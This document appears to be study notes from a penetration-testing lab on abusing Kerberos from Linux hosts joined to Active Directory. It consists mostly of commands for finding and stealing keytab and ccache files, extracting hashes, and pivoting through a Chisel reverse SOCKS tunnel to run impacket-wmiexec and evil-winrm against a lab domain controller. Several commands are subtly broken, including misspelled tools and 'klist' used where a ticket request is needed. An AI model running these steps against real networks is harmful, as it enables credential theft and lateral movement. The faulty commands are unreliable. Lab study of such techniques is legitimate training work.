# Kerberos on Linux
- Linux stores Kerberos tickets as ccache files in /tmp. 
- By default, the location of the Kerberos ticket is stored in the environmnet variable KRB5CCNAME.
- Keytab file: contains pairs of Kerberos principals and encyrpted keys.

# Scenario
- LINUX01 is connected to Domain Controller, can only be reached by MS01
- Two ways to connect to LINUX01:
    - RDP to MS01, then from MS01 SSH to LINUX01
    - Use portforwarding
    ```shell
    ssh $USER@$DOMAIN@$IP -p 2222
    
    # By connecting to port TCP/2222 on MS01, we will gain access to port TCP/22 on LINUX01
    ```
    
# Identify Linux and Active Directory Integration
### Check if Linux is Domain joined
  - realm
    ```shell
      realm list
    ```
  - PS
    ```shell
      ps -ef | grep -i "windbind\|sssd"
    ```
# Finding Kerberos Tickets in Linux
### Finding Keytab files
- Using Find
```shell
  find / -name *keytab* -ls 2>/dev/null
```
### Identify Keytab Files in Cronjobs
```shell
  crontab -l
```
- Look for **kinit**, which allows interation with Kerberos, and its function si to request the users's TGT and store this ticket in the cache. 
### Finding ccache Files
- Review Environemnet Variables for ccache files
```shell
  env | grep -i krb5
```
### Search for ccache files in /tmp
```shell
  ls -la /tmp
```
# Abusing KeyTab files
### Listing Keytab file information
```shell
  klsit -k -t
```
1. Impersonating a user wiht a keytab
```shell
  klist
  klist $USER@DOMAIN -k -t /opt/specialfiles/$USER.keytab
  klist
```
- Connect to SMB as the user
```shell
  smblcient //$DOMAIN/$USER -k -c ls
```
- NOTE: to keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable KRB5CCNAME

2. Keytab Extract
- Use ![KeyTabExtract](https://github.com/sosdave/KeyTabExtract) to extract valuable information from 502-type .keytab files.
```shell
python3 /opt/keytabextract.py /opt/specialfiles/$USER.keytab
```
- Log in as the user
```shell
  su - $USER@DOMAIN
  klist
```
- Obtain more hashes: we can continue investigate the keytab file found in the cronjob, repeat the process and gain more hashes.

# Abuse Keytab ccache
- Escalte privilege (when possible) to read the ccache files
```shell
  ls -la /tmp
```
- Check the group of the users:
```shell
id $USER@$DOMAIN
```
- To use ccache file, we need to assign the file to the KRB5CCNAME variable
```shell
  cp /tmp/$CCACHEFILE .
  export KRB5CCNAME=/root/$CCACHEFILE
  klist
```

-------------------------------
# Using Linux Attack Tools with Kerberos
-------------------------------
- When using tools from a domain-joined machine, we need to ensure our KRB5CCNAME environment variable is set to the ccache file we want to use. When attacking from a machine that is not a member of domain, we need to use [Chisel](https://github.com/jpillora/chisel) [proxychains](https://github.com/haad/proxychains) and edit the host file.
```shell
cat /etc/hosts
172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```
- Configure Proxychains file to use socks5 and port 1080
```shell
    cat /etc/proxychains.conf
    socks5 127.0.0.1 1080
```
- Download Chisel to PWNBOX
```shell
    wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
    gzip -d chisel_1.7.7_linux_amd64.gz
    mv chisel_* chisel && chmod +x ./chisel
    sudo ./chisel server --reverse 
```
- RDP to MS01 machine
- Execute chisel from MS01 machine
```shell
    chisel.exe client $PWNBOX_IP:8080 R:socks
```
- Transfer ccache file from LINUX-1 and create environment varialbe KRB5CCNAME with the value corresponding to the path of the ccachfile
```shell
    export KRB5CCNAME=/home/htb-student/$CCACHE_FILE
```

## Impacket
- Use Impacket with proxychains and Kerberos Authentication
```shell
    # PWNBOX
    proxychains impacket-wmiexec ms01 -k
    
    # if prompted for a password, use -no-pass option
 ```
 ## Evil-winrm
 - Must install the package
 ```shell
    # PWNBOX
    sudo apt-get install krb5-user -y
 ```
 - Configure the Keberos file for the Domain
 ```shell
     cat /etc/krb5.conf
     default_realm = INLANEFREIGHT.HTB
     
     [realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
 ```
 - Using Evil-WinRM with Kerberos
 ```shell
    proxychains evil-winrm -i dc01 -r inlanefreight.htb
 ```

